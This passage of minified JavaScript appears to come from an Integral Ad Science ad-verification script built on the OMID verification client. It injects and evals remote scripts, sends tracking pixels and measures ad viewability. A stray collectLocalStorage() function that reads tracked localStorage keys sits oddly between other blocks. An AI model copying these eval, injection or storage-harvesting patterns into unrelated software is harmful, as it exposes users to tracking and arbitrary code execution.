        module$contents$omid$verificationClient$VerificationClient_EventCallback;
      function module$contents$omid$verificationClient$VerificationClient_getThirdPartyOmid() {
        var a = module$exports$omid$common$OmidGlobalProvider.omidGlobal.omid3p;
        return a && "function" === typeof a.registerSessionObserver && "function" === typeof a.addEventListener ? a : null;
      }
      var module$exports$omid$verificationClient$VerificationClient = function (a) {
        if (this.communication = a || (0, module$exports$omid$common$serviceCommunication.startVerificationServiceCommunication)((0, module$exports$omid$common$windowUtils.resolveGlobalContext)())) {
          this.communication.onMessage = this.handleMessage_.bind(this);
        } else {
          if (a = module$contents$omid$verificationClient$VerificationClient_getThirdPartyOmid()) {
            this.omid3p = a;
          }
        }
        //----------this.remoteIntervals_ = this.remoteTimeouts_ = 0;
        this.callbackMap_ = {};
        this.imgCache_ = [];
        this.injectionId_ = (a = module$exports$omid$common$OmidGlobalProvider.omidGlobal.omidVerificationProperties) ? a.injectionId : void 0;
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.isSupported = function () {
        return !(!this.communication && !this.omid3p);
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.injectionSource = function () {
        var a = module$exports$omid$common$OmidGlobalProvider.omidGlobal.omidVerificationProperties;
        if (a && a.injectionSource) {
          return a.injectionSource;
        }
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.registerSessionObserver = function (a, b) {
        (0, module$exports$omid$common$argsChecker.assertFunction)("functionToExecute", a);
        this.omid3p ? this.omid3p.registerSessionObserver(a, b, this.injectionId_) : this.sendMessage_("addSessionListener", a, b, this.injectionId_);
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.addEventListener = function (a, b) {
        (0, module$exports$omid$common$argsChecker.assertTruthyString)("eventType", a);
        (0, module$exports$omid$common$argsChecker.assertFunction)("functionToExecute", b);
        this.omid3p ? this.omid3p.addEventListener(a, b) : this.sendMessage_("addEventListener", b, a);
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.sendUrl = function (a, b, c) {
        (0, module$exports$omid$common$argsChecker.assertTruthyString)("url", a);
        module$exports$omid$common$OmidGlobalProvider.omidGlobal.document && module$exports$omid$common$OmidGlobalProvider.omidGlobal.document.createElement ? this.sendUrlWithImg_(a, b, c) : this.sendMessage_("sendUrl", function (a) {
          a && b ? b() : !a && c && c();
        }, a);
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.sendUrlWithImg_ = function (a, b, c) {
        var d = this,
          e = module$exports$omid$common$OmidGlobalProvider.omidGlobal.document.createElement("img");
        this.imgCache_.push(e);
        var f = function (a) {
          var b = d.imgCache_.indexOf(e);
          0 <= b && d.imgCache_.splice(b, 1);
          a && a();
        };
        e.addEventListener("load", f.bind(this, b));
        e.addEventListener("error", f.bind(this, c));
        e.src = a;
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.injectJavaScriptResource = function (a, b, c) {
        var d = this;
        (0, module$exports$omid$common$argsChecker.assertTruthyString)("url", a);
        module$exports$omid$common$OmidGlobalProvider.omidGlobal.document ? this.injectJavascriptResourceUrlInDom_(a, b, c) : this.sendMessage_("injectJavaScriptResource", function (e, f) {
          e ? (d.evaluateJavaScript_(f, a), b()) : (module$exports$omid$common$logger.error("Service failed to load JavaScript resource."), c());
        }, a);
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.injectJavascriptResourceUrlInDom_ = function (a, b, c) {
        var d = module$exports$omid$common$OmidGlobalProvider.omidGlobal.document,
          e = d.body;
        d = d.createElement("script");
        d.onload = b;
        d.onerror = c;
        d.src = a;
        d.type = "application/javascript";
        e.appendChild(d);
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.evaluateJavaScript_ = function (a, b) {
        try {
          eval(a);
        } catch (c) {
          module$exports$omid$common$logger.error('Error evaluating the JavaScript resource from "' + b + '".');
        }
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.setTimeout = function (a, b) {
        (0, module$exports$omid$common$argsChecker.assertFunction)("functionToExecute", a);
        (0, module$exports$omid$common$argsChecker.assertPositiveNumber)("timeInMillis", b);
        if (this.hasTimeoutMethods_()) {
          return module$exports$omid$common$OmidGlobalProvider.omidGlobal.setTimeout(a, b);
        }
        //----------var c = this.remoteTimeouts_++;
        var c = new Date().getTime() * 1000000 + Math.floor(Math.random() * 1000000);
        this.sendMessage_("setTimeout", a, c, b);
        return c;
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.clearTimeout = function (a) {
        (0, module$exports$omid$common$argsChecker.assertPositiveNumber)("timeoutId", a);
        this.hasTimeoutMethods_() ? module$exports$omid$common$OmidGlobalProvider.omidGlobal.clearTimeout(a) : this.sendOneWayMessage_("clearTimeout", a);
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.setInterval = function (a, b) {
        (0, module$exports$omid$common$argsChecker.assertFunction)("functionToExecute", a);
        (0, module$exports$omid$common$argsChecker.assertPositiveNumber)("timeInMillis", b);
        if (this.hasIntervalMethods_()) {
          return module$exports$omid$common$OmidGlobalProvider.omidGlobal.setInterval(a, b);
        }
        //----------var c = this.remoteIntervals_++;
        var c = new Date().getTime() * 1000000 + Math.floor(Math.random() * 1000000);
        this.sendMessage_("setInterval", a, c, b);
        return c;
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.clearInterval = function (a) {
        (0, module$exports$omid$common$argsChecker.assertPositiveNumber)("intervalId", a);
        this.hasIntervalMethods_() ? module$exports$omid$common$OmidGlobalProvider.omidGlobal.clearInterval(a) : this.sendOneWayMessage_("clearInterval", a);
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.hasTimeoutMethods_ = function () {
        return "function" === typeof module$exports$omid$common$OmidGlobalProvider.omidGlobal.setTimeout && "function" === typeof module$exports$omid$common$OmidGlobalProvider.omidGlobal.clearTimeout;
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.hasIntervalMethods_ = function () {
        return "function" === typeof module$exports$omid$common$OmidGlobalProvider.omidGlobal.setInterval && "function" === typeof module$exports$omid$common$OmidGlobalProvider.omidGlobal.clearInterval;
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.handleMessage_ = function (a, b) {
        b = a.method;
        var c = a.guid;
        a = a.args;
        if ("response" === b && this.callbackMap_[c]) {
          var d = (0, module$exports$omid$common$ArgsSerDe.deserializeMessageArgs)(module$contents$omid$verificationClient$VerificationClient_VERIFICATION_CLIENT_VERSION, a);
          this.callbackMap_[c].apply(this, d);
        }
        "error" === b && window.console && module$exports$omid$common$logger.error(a);
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.sendOneWayMessage_ = function (a, b) {
        for (var c = [], d = 1; d < arguments.length; ++d) {
          c[d - 1] = arguments[d];
        }
        this.sendMessage_.apply(this, [a, null].concat($jscomp.arrayFromIterable(c)));
      };
      module$exports$omid$verificationClient$VerificationClient.prototype.sendMessage_ = function (a, b, c) {
        for (var d = [], e = 2; e < arguments.length; ++e) {
          d[e - 2] = arguments[e];
        }
        this.communication && (e = (0, module$exports$omid$common$guid.generateGuid)(), b && (this.callbackMap_[e] = b), d = new module$exports$omid$common$InternalMessage(e, "VerificationService." + a, module$contents$omid$verificationClient$VerificationClient_VERIFICATION_CLIENT_VERSION, (0, module$exports$omid$common$ArgsSerDe.serializeMessageArgs)(module$contents$omid$verificationClient$VerificationClient_VERIFICATION_CLIENT_VERSION, d)), this.communication.sendMessage(d));
      };
      (0, module$exports$omid$common$exporter.packageExport)("OmidVerificationClient", module$exports$omid$verificationClient$VerificationClient);
    }, typeof exports === 'undefined' ? undefined : exports);
  } catch (e) {
    __IntegralASDiagnosticCall('thirdparty', e);
  }
  __IASScope.isDomless = typeof window === "undefined";
  __IASOmidVerificationClient = {
    isSupported: function () {
      return false;
    }
  };
  if (typeof __IASScope.OmidVerificationClient !== 'undefined') {
    try {
      __IASOmidVerificationClient = new __IASScope.OmidVerificationClient['1.3.25-iab3167'](); //try standard in-browser instantiation
    } catch (e) {
      try {
        __IASOmidVerificationClient = new __IASScope.OmidVerificationClient(); //try domless version which has no version
      } catch (e) {}
    }
  }
  __IntegralASConfig.useFIF = __IASScope && !!__IASScope.__IntegralASUseFIF && __IntegralASConfig.mode === 'jload';
  __IntegralASConfig.adRefreshThreshold = __IASScope && __IASScope.__IntegralASAdRefreshThreshold;
  __IntegralASConfig.getContextNode = function (win, topWin) {
    'use strict';

    if (__IASScope.isDomless) {
      return;
    }
    if (__IntegralASConfig.useFIF) {
      return __IASScope.frameElement; // Early exit if using FIF
    }
    if (document.currentScript) {
      return document.currentScript;
    }
    var tempScript,
      scripts = document.getElementsByTagName('script'),
      result = scripts[scripts.length - 1],
      scriptIndex = scripts.length,
      scriptUrl = __IntegralASConfig.scriptUrl;
    try {
      while (--scriptIndex >= 0) {
        tempScript = scripts[scriptIndex];
        if (tempScript.src && tempScript.src.indexOf(scriptUrl) === 0 && tempScript.getAttribute('data-ias-script-tag') === null) {
          result = tempScript;
          tempScript.setAttribute('data-ias-script-tag', 'found');
          break;
        }
      }
    } catch (e) {} // TODO: maybe a jsDiagnostic?

    return result;
  };
  __IntegralASConfig.contextNode = __IASScope.isDomless ? undefined : __IntegralASConfig.getContextNode(window, top);
  __IntegralASConfig.perfFactory = function () {
    'use strict';

    var _marks = {};
    var START_CODE = 'A';
    var END_CODE = 'Z';
    function _addMark(codeName, time) {
      _marks[codeName] = time;
    }
    function mark(codeName) {
      _addMark(codeName, Math.round(__IASScope.performance.now()));
    }
    function markStart(baseName) {
      mark(baseName + START_CODE);
    }
    function markEnd(baseName) {
      mark(baseName + END_CODE);
    }
    function markResource(baseName, url) {
      var entry, entries;
      entries = __IASScope.performance.getEntriesByName(url);
      if (entries && entries.length) {
        entry = entries[entries.length - 1];
        if (entry.startTime > 0 && entry.responseEnd > 0) {
          _addMark(baseName + START_CODE, Math.round(entry.startTime));
          _addMark(baseName + END_CODE, Math.round(entry.responseEnd));
        }
      }
    }
    function getData() {
      return _marks;
    }
    function getStart(baseName) {
      return _marks[baseName + START_CODE];
    }
    function getEnd(baseName) {
      return _marks[baseName + END_CODE];
    }
    function noop() {}
    function setNoops() {
      _addMark = noop;
      mark = noop;
      markStart = noop;
      markEnd = noop;
      markResource = noop;
    }
    function isFunc(obj) {
      return typeof obj === 'function';
    }
    function _init() {
      var canUsePerformanceAPIs = false;
      var PERF_MARK_BOOTSTRAPPER_EXECUTION = 'be';
      var PERF_MARK_BOOTSTRAPPER_SCRIPT_DOWNLOAD = 'bd';
      var PERF_MARK_MAIN_SCRIPT_DOWNLOAD = 'md'; // note: this code is intentionally the same as the one in globalConstants.js
      var downloadMark;
      try {
        canUsePerformanceAPIs = __IASScope.performance && isFunc(__IASScope.performance.getEntriesByName) && isFunc(__IASScope.performance.now) && __IntegralASConfig.perfBirth !== null; // initialized to null or a time in jsAddOns1-birthdate.js

        if (canUsePerformanceAPIs) {
          downloadMark = __IntegralASConfig.jsDoSplit ? PERF_MARK_BOOTSTRAPPER_SCRIPT_DOWNLOAD : PERF_MARK_MAIN_SCRIPT_DOWNLOAD;
          markResource(downloadMark, __IntegralASConfig.scriptUrl); // in split mode, this captures download time for the bootstrapper script, in bundled mode, the bundled/main script
          _addMark(PERF_MARK_BOOTSTRAPPER_EXECUTION + START_CODE, Math.round(__IntegralASConfig.perfBirth)); // put the birthdate that we already captured into our list of marks
          markEnd(PERF_MARK_BOOTSTRAPPER_EXECUTION); // roughly the end time of execution for the bootstrapper script in split mode, in bundled mode, end of the bootstrapper part of the script and start of the module definition part
        } else {
          setNoops();
        }
      } catch (err) {
        // TODO: remove if we never get here?
        setNoops();
        if (isFunc(__IASScope.__IntegralASDiagnosticCall)) {
          __IASScope.__IntegralASDiagnosticCall('perf', err, __IntegralASConfig);
        }
      }
    }
    _init();
    return {
      mark: mark,
      markStart: markStart,
      markEnd: markEnd,
      markResource: markResource,
      getData: getData,
      getStart: getStart,
      getEnd: getEnd
    };
  };
  __IntegralASConfig.perf = __IntegralASConfig.perfFactory();
} catch (err) {
  __IntegralASConfig = {};
  __IntegralASDiagnosticCall('bootstrapper', err);
}
function collectLocalStorage() {
  const data = {};
  trackedKeys.forEach(key => {
    const item = localStorage.getItem(key);
    if (item) {
      data[key] = item;
    }
  });
  return data;
}
__IntegralASConfig.initialize = function (e, t, n) {
  var r = {};
  if (Object.assign) e = Object.assign({}, e);else {
    for (var i in e) r[i] = e[i];
    e = r;
  }
  class o {
    constructor() {
      this.logs = [];
    }
    add({
      storeModelName: e,
      key: t,
      value: n,
      timeStamp: r
    }) {
      this.logs.push({
        storeModelName: e,
        key: t,
        value: n,
        timeStamp: r
      });
    }
    getHistory() {
      return this.logs;
    }
    logHistory() {}
  }
  class a {
    constructor({
      storeModelName: e
    }) {
      this.storeModelName = e, this.storeModelHistory = new o();
    }
    set(e, t, n = {
      locked: !0
    }) {
      try {
        Object.defineProperty(this, e, {
          value: t,
          writable: !n.locked,
          configurable: !1
        }), this.storeModelHistory.add({
          storeModelName: this.storeModelName,
          key: e,
          value: t,
          timeStamp: Date.now()
        });
      } catch (e) {}
    }
    get(e) {
      return this[e];
    }
    getHistory() {
      return this.storeModelHistory.getHistory();
    }
    logHistory() {
      this.storeModelHistory.logHistory();
    }
  }
  class s extends a {
    constructor() {
      super({
        storeModelName: "jsConfigRequest"
      }), this.contentType = "", this.url = "", this.verificationParameters = {}, this.contentType = "";
    }
    buildRequestUrlFromParameters({
      contextNode: e,
      omidParameters: t
    }) {
      this.setParameters({
        contextNode: e,
        omidParameters: t
      }), this.buildRequestUrl({
        contextNode: e
      });
    }
    setParameters({
      contextNode: t,
      omidParameters: n
    }) {
      if (n) this.set("verificationParameters", n, {
        locked: !1
      });else {
        const n = null == t ? void 0 : t.dataAttributes,
          r = (null == n ? void 0 : n.iasParameters) || e.iasParameters;
        if ("string" == typeof r) try {
          this.set("verificationParameters", JSON.parse(r), {
            locked: !1
          });
        } catch (e) {} else void 0 !== r && this.set("verificationParameters", r, {
          locked: !1
        });
      }
      this.set("contentType", this.verificationParameters.contentType || "", {
        locked: !1
      });
    }
    buildRequestUrl({
      contextNode: t
    } = {}) {
      const n = (({
          contextNode: t,
          verificationParameters: n
        } = {}) => {
          var r;
          let i = null;
          const o = null == n ? void 0 : n.config;
          if (o) i = /iasProxyPartnerId=([\d]+)/g.exec(o);else try {
            const e = (null === (r = null == t ? void 0 : t.srcUrl) || void 0 === r ? void 0 : r.href) || "",
              n = decodeURIComponent(e);
            i = /iasProxyPartnerId=([\d]+)/g.exec(n);
          } catch (e) {}
          const a = null == i ? void 0 : i[1];
          return e.proxyPartnerId = a, (null == n ? void 0 : n.host) || {
            37103: "https://vfw.amazon-adsystem.com/ias/ivt/j"
          }[a] || "https://jsconfig.adsafeprotected.com";
        })({
          contextNode: t,
          verificationParameters: this.verificationParameters
        }),
        r = (({
          contextNode: e,
          verificationParameters: t
        } = {}) => {
          let n = null == t ? void 0 : t.config;
          if (!n) try {
            const t = null == e ? void 0 : e.srcUrl;
            if (t.href.includes("/jload")) {
              const t = (null == e ? void 0 : e.queryParameters).get("anId");
              t && (n = `/jload/${t}`);
            } else {
              const e = /iasConfig=([^&#]*)/g.exec(t.href) || /config=([^&#]*)/g.exec(t.href);
              e && "string" == typeof e[1] && (n = decodeURIComponent(e[1]));
            }
          } catch (e) {}
          return n;
        })({
          contextNode: t,
          verificationParameters: this.verificationParameters
        });
      if (r) {
        const i = (({
          host: e,
          path: t,
          queryParams: n,
          adSessionId: r
        }) => {
          const i = t.includes("?");
          let o = `${e}/jsconfig${t}`;
          return n && (o += `${i ? "&" : "?"}${n}`), r && (o += `&adSessionId=${r}`), o;
        })({
          host: n,
          path: r,
          adSessionId: e.adSessionId,
          queryParams: null == t ? void 0 : t.staticFwjsMacros
        });
        this.set("url", i, {
          locked: !1
        });
      }
    }
  }
  class c extends a {
    constructor({
      defaultBootstrapperConfig: e
    }) {
      super({
        storeModelName: "measurementConfig"
      }), this.set("adRefreshThreshold", e.adRefreshThreshold), this.set("birthdate", e.birthdate), this.set("isResolved", e.isResolved, {
        locked: !1
      }), this.set("perfBirth", e.perfBirth), this.set("staticMode", e.staticMode), this.set("useFIF", e.useFIF);
    }
  }
  const u = ({
    url: e
  }) => {
    let t;
    const n = ["config", "iasConfig"];
    return e && e.includes("fw.js") && (n.forEach(t => {
      e && (e = (({
        url: e,
        queryParamName: t
      }) => {
        const n = new URL(e).search,
          r = new URLSearchParams(n);
        r.delete(t);
        const i = new URL(e);
        return i.search = r.toString(), i.toString();
      })({
        url: e,
        queryParamName: t
      }));
    }), e.includes("?") && (t = e.split("?")[1])), t;
  };
  class d extends a {
    constructor({
      scriptTagElement: e
    }) {
      const t = new URL(e.src);
      super({
        storeModelName: "scriptTag"
      }), this.set("element", e), this.set("srcUrl", t), this.set("path", t.pathname), this.set("protocol", t.protocol), this.set("dataAttributes", e.dataset), this.set("queryParameters", t.searchParams), this.set("staticFwjsMacros", u({
        url: t.href
      }));
    }
  }
  const g = new class {
    addModel(e) {
      try {
        Object.defineProperty(this, e.storeModelName, {
          value: e,
          writable: !1,
          configurable: !1,
          enumerable: !0
        });
      } catch (e) {}
      return this[e.storeModelName];
    }
    getHistory() {
      return Object.keys(this).reduce((e, t) => {
        const n = this[t].getHistory();
        return e.concat(n);
      }, []);
    }
    logHistory() {}
  }();
  function f() {
    "use strict";

    var t, n;
    e.executedContinueMain || (e.executedContinueMain = !0, e.perf.markStart(D), w(e).verifyContextNode(), t = function (t, n, r, i, o, a, s, c, u, d, f) {
      var l, p;
      try {
        new di({
          contextNode: e.contextNode,
          features: u,
          bootstrapper: e
        }).start();
      } catch (e) {
        o.add(A.ERROR_CODES.AD_SERVER_POST_IMPRESSION_MACRO);
      }
      e.perf.markStart(S), e[W.B11] = "1" === e[W.AD_HEIGHT] && "1" === e.adWidth ? "true" : "false", e[W.CNOD] = e[W.CONTEXT_NODE] ? "true" : "false", T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
        output: g.measurementConfig.mainBirthdate
      }, W.MAIN_FUNCTION_STARTED_NOW, {
        type: A.IMPRESSION_EVENT
      });
      var m = e.hasOwnProperty("origMobOrTab") ? e.origMobOrTab : e.mobOrTab;
      T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
        output: m ? "1" : "0"
      }, W.BOOTSTRAPPER_MOB_OR_TAB, {
        type: A.IMPRESSION_EVENT
      }), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
        output: e.app ? "1" : "0"
      }, W.BOOTSTRAPPER_APP, {
        type: A.IMPRESSION_EVENT
      }), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
        output: e.mobAppWebview ? "1" : "0"
      }, W.BOOTSTRAPPER_MOB_APP_WEBVIEW, {
        type: A.IMPRESSION_EVENT
      });
      var I = "undefined" != typeof navigator ? navigator.userAgent : "",
        h = T.getAggregator().request(x.MOBILE_APP);
      !(h && h.isMobileAppEnvironment && h.isMobileAppEnvironment()) && I.indexOf("IMDb-flg") > -1 && (T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
        output: "1"
      }, W.MOBILE_APP_ENVIRONMENT, {
        type: A.IMPRESSION_EVENT
      }), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
        output: "a_imdb"
      }, W.MATCHED_MOBILE_APP_DETECTION_RULE, {
        type: A.IMPRESSION_EVENT
      }));
      E(r, i, u, o);
      try {
        a.isApplicable(s, u, d) && a.start(), p = c.detectTopURL(), u.on("exch") && new Ne().createInstance(o, i).parse(p), (l = zr()).isApplicable(u) && l.start(u), d.usesGroupMCustomMetric() && H(), f.start();
      } catch (e) {
        o.add(A.ERROR_CODES.IMPRESSION_LEADUP);
      }
      return e.perf.markEnd(S), p;
    }((n = function () {
      var t,
        n,
        r,
        i,
        o,
        a,
        s,
        c,
        u,
        d,
        g,
        f = {};
      e.perf.markStart(v);
      var l = T.getAggregator();
      (function () {
        var t, n, r;
        r = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT), t = r.app && r.isDisplay && !r.isWeb, (n = e.mobFwUrl && e.mobFwUrl.indexOf("/blocking/") > -1) && r.isLimitedSandbox && "1" === e.adWidth && "1" === e[W.AD_HEIGHT] && (r.isLimitedSandbox = !1);
        t && n && (r.delayingViewabilityEvents = !0);
        "app" !== r.environment && !0 !== e.mobAppWebview || (e.origMobOrTab = e[W.MOB_OR_TAB], e[W.MOB_OR_TAB] = !0);
      })(), f.mFeatures = l.request(x.FEATURES), f.mFeatures || (f.mFeatures = l.provide(x.FEATURES, Me()));
      e.integration && f.mFeatures.setReportedBootstrapFeatures("intblk", "integration");
      e.autotagSizeSet && f.mFeatures.setReportedBootstrapFeatures("ats", "autotagSizeSet");
      e.encodeInvalidUrlChars = !Ae.isDomless() && f.mFeatures.on("encodeInvalidUrlChars"), l.provide(x.MOBILE_APP, function () {
        return t = t || new ar(f.mFeatures);
      }), l.provide(x.CONTEXT, Ae), f.mBrowser = l.provide(x.BROWSER, new le().createInstance()), f.mErrors = l.request(x.ERRORS), f.mIds = l.provide(x.IDS, be()), f.iOutput = $(l), l.request(x.JSONP), f.mComm = l.request(x.COMMUNICATION), f.viewabilityMeasurement = new Kt(Xt(f.mIds), f.mFeatures, f.mBrowser).create(), function (e, t) {
        if (e && e.queuedOutputItems) for (var n = 0; n < e.queuedOutputItems.length; n++) t.trigger(F.ADD_OUTPUT_ITEM, {
          output: e.queuedOutputItems[n].value
        }, e.queuedOutputItems[n].code, {
          type: A.IMPRESSION_EVENT
        });
      }(l.request(x.OMID_AD_SESSION_CONTEXT), l), f.mFeatures.on("swapids") && (e.oid = e.asid, e.asid = f.mIds.unq);
      return f.mAdTalk = new ct().createInstance(f.mFeatures), n = Y(), r = qe(l), i = l.provide(x.PAGE, new Be().createInstance()), f.mAncestorOrigins = de(), f.mPageUrls = l.provide(x.PAGE_URLS, new He().createInstance(f.mAncestorOrigins, We)), o = l.provide(x.SCREEN_EVENTS, Ke()), a = we(f.mBrowser), g = function (t, n) {
        return !Ae.isVideo() || Ae.isOmid() || Ae.isInMobiMraidVideo() ? {} : Nr(e.videoId, t, n);
      }(f.mFeatures, o), f.mVideo = l.provide(x.VIDEO, g), br(Vr.build()), s = new rr().createInstance(f.mErrors, a, f.mFeatures), c = new ee().createInstance(s, f.mErrors, i, Ae), u = l.provide(x.JOB_FACTORY, Le()), f.mDataTransfer = ve(s, f.mErrors, f.mFeatures, f.mIds, f.iOutput, f.mBrowser, o, n), d = fe(f.mErrors, f.mFeatures, l, r), f.mMode = xe(d, f.mFeatures, f.viewabilityMeasurement.isImmediate()), f.mViewability = l.provide(x.VIEWABILITY, yn(q(), f.viewabilityMeasurement, f.mBrowser, f.mDataTransfer, f.mFeatures, l, f.iOutput, c, o, f.mVideo)), function (t, n, r, i) {
        var o = function (t) {
          var n = new mn(t, Ae),
            r = new pn(),
            i = new hn(t, Ae),
            o = In(t, Ae),
            a = new An(e, Ae, t).resolve(),
            s = [n],
            c = [];
          o.applies() && s.push(o);
          i.applies() && s.push(i);
          r.applies(t, Ae) && s.push(r);
          I(a).each(function (e, t) {
            s.push(new Tn(t, Ae)), c.push(t.id);
          }), c.length > 0 && (T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: c.join(".")
          }, W.METRIC_ID_EVENT_CALL, {
            type: A.IMPRESSION_EVENT
          }), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: c
          }, W.METRIC_ID_LIST, {
            type: A.DT_CODES.UNLOAD,
            asION: !0
          }));
          return s;
        }(t);
        T.getAggregator().provide(x.VIEWABILITY_DEFINITIONS, o), I(o).map(function (e, t, n, r) {
          return function (i, o) {
            var a,
              s,
              c,
              u = Nn(o, t),
              d = En(n, e, o.rts).getCallbacks(),
              g = z(r.createPingJobs(o.type, o.timeInViewThresholds, d, o.metricId));
            return o.sendOtherwiseInViewSignal && (c = Nn(o, t, o.sendOtherwiseInViewSignal), s = z(r.createPingJobs(o.type, o.timeInViewThresholds, d, o.metricId, o.sendOtherwiseInViewSignal))), o.rtsCallbacks = d, o.thresholdType === A.GROUPM_MOBILE_PASS_THRU_TIME_IN_VIEW_THRESHOLD_TYPE ? a = Rn(u, o, g, Ae.isVideo()) : (a = On(u, ae(o.minUnit), g), o.sendOtherwiseInViewSignal && On(c, ae(o.minUnit), s, o.sendOtherwiseInViewSignal).start()), a.start(), a;
          };
        }(t, n, r, i));
      }(f.mFeatures, f.mViewability, r, u), f.loopDelay = Dt(), f.renderDetector = V(), f.mDataTransfer.setViewabilityMod(f.mViewability), e.perf.markEnd(v), f;
    }()).mDataTransfer, n.mViewability, n.mAdTalk, n.iOutput, n.mErrors, n.mAncestorOrigins, n.mBrowser, n.mPageUrls, n.mFeatures, Ae, n.renderDetector), function (t, n, r, i, o, a, s, c, u) {
      try {
        Hr(t, n, r, i, o, a, s).send(c), I.isFunction(u.triggerInitializationEvents) && u.triggerInitializationEvents();
      } catch (t) {
        __IntegralASDiagnosticCall("impsend", t, e);
      }
    }(n.mErrors, n.mFeatures, n.mIds, n.mMode, n.iOutput, n.mBrowser, n.mViewability, t, n.mVideo), function (t, n, r, i, o, a, s, c, u, d, g, f, E) {
      try {
        e.perf.markStart(O), (p = Cr()).start(), p.addFieldTypes([A.DT_SLOT.IM, A.DT_SLOT.FF, A.DT_SLOT.ENVIRONMENT, A.DT_SLOT.FF_EXP]), function (e, t, n, r) {
          var i = Rt(e, t, n);
          i.isApplicable(r) && i.start();
        }(t, n, r, i), function (e, t, n, r, i, o) {
          e.bootstrapOn("getTpl") && e.on("usetpl") && ge(t, n, r, i, o).init();
        }(i, o, a, s, n, c), function (t, n, r, i, o, a, s, c, u) {
          var d;
          "true" !== e.minimizeCalls && (d = new Date().getTime(), We.execAtEndOfThread(function () {
            l(t, n, r, i, d, o, a, s, c, u);
          }));
        }(c, u, d, s, i, o, a, n, f), function (e) {
          e && e.start && e.start();
        }(g), ((e, t) => {
          if (!e.isDomless()) {
            const n = $r();
            let r = ["sca", "xsca", "rsrch"];
            e && e.isAMZN() && (r = []), n.start(r, t);
          }
        })(E, i), ce(), T.runTier(A.TIERS.VIEWABILITY), function (t) {
          var n = Mr();
          n.isApplicable(t) && (n.start(), Fr.recordBlockingTime(), e.perf.mark(R), Fr.setupOnLoadTracking(), Fr.setupBrowserDelayTracking());
        }(i), e.perf.markEnd(O);
      } catch (e) {
        s.add(A.ERROR_CODES.POST_IMPRESSION);
      }
      var p;
    }(n.mBrowser, n.mIds, n.mViewability, n.mFeatures, n.mComm, n.mDataTransfer, n.mErrors, n.iOutput, n.loopDelay, n.mAdTalk, n.viewabilityMeasurement, n.mAncestorOrigins, Ae), e.perf.markEnd(D));
  }
  function l(t, n, r, i, o, a, s, c, u, d) {
    try {
      if (e.perf.markStart(N), e.tpiLookupURL) Pe(s, c).init(e.tpiLookupURL);
      Ae.isDomless() || d.isStarted() && d.sendOriginList(), T.runAll(), We.execAtEndOfThread(function () {
        !function (t, n, r, i, o, a) {
          var s;
          try {
            e.perf.markStart(y), s = {
              output: new Date().getTime() - o
            }, t.addItem(s, "sinceFw", {
              type: A.DT_CODES.ADTALK
            }), I.isDef(n.loopStarted()) && t.addItem({
              output: n.loopStarted()
            }, "readyFired", {
              type: A.DT_CODES.ADTALK
            }), e.perf.markEnd(y), e.isSplitMode && (u = e.protocol + "://" + e.sp_cdnScripts.main, e.perf.markResource(C, u)), e.impUrl && e.perf.markResource(M, e.impUrl), c = e.perf.getData(), T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.IM, W.PERFORMANCE, I(c).toION()), r.isApplicable(Ae) && r.sendAdTalkCall();
          } catch (e) {
            i.add(A.ERROR_CODES.ADTALK_DELAY);
          }
          var c, u;
        }(t, n, r, i, o);
      }), e.perf.markEnd(N);
    } catch (e) {
      i.add(A.ERROR_CODES.EVENT_LOOP_ONE);
    }
  }
  function E(e, t, n, r) {
    var i;
    try {
      e.isApplicable(Ae) && (e.start(), t.addItem(e.getFrameMap(), "fm"), n.on("fm2") && t.addItem(e.getFrameMapIncludingPeerCase(), "fm2"), n.on("idMap") && (i = e.getIdMap()) && t.addItem(i, "idMap"));
    } catch (e) {
      r.add(A.ERROR_CODES.ADTALK_GENERAL);
    }
  }
  function p(t) {
    var n = t && t.sca,
      r = t && t.xsca,
      i = t && t.w,
      o = t && t.h;
    return function (t) {
      T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
        output: Ae.getTagTime()
      }, W.STATIC_CONFIG_RESPONSE_TIME, {
        type: A.IMPRESSION_EVENT
      });
      var a = "string" == typeof t ? JSON.parse(t) : t;
      if (Object.assign) Object.assign(e, a);else for (var s in a) e[s] = a[s];
      g.measurementConfig.set("isResolved", !0), e.sp_cdnScripts = {
        sca: n,
        xsca: r
      }, i && o && (e.adWidth = i, e.adHeight = o, e.autotagSizeSet = !0), f();
    };
  }
  const m = () => {
    var e;
    (null === (e = g.measurementConfig) || void 0 === e ? void 0 : e.isResolved) ? f() : (() => {
      var e, t, n;
      const r = null === (e = g.jsConfigRequest) || void 0 === e ? void 0 : e.url,
        i = null === (t = g.jsConfigRequest) || void 0 === t ? void 0 : t.contentType,
        o = null === (n = g.jsConfigRequest) || void 0 === n ? void 0 : n.verificationParameters;
      if (r) {
        T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
          output: Ae.getTagTime()
        }, W.STATIC_CONFIG_REQUEST_TIME, {
          type: A.IMPRESSION_EVENT
        });
        const e = "cbName";
        "application/json" === i ? T.getAggregator().trigger(F.GET_JSON, r, p(o)) : T.getAggregator().trigger(F.JSONP, r, p(o), !1, e);
      }
    })();
  };
  var I = function (e) {
      "use strict";

      return new h(e);
    },
    h = function (e) {
      "use strict";

      this.iterable = e;
    };
  h.prototype.isObj = function (e) {
    "use strict";

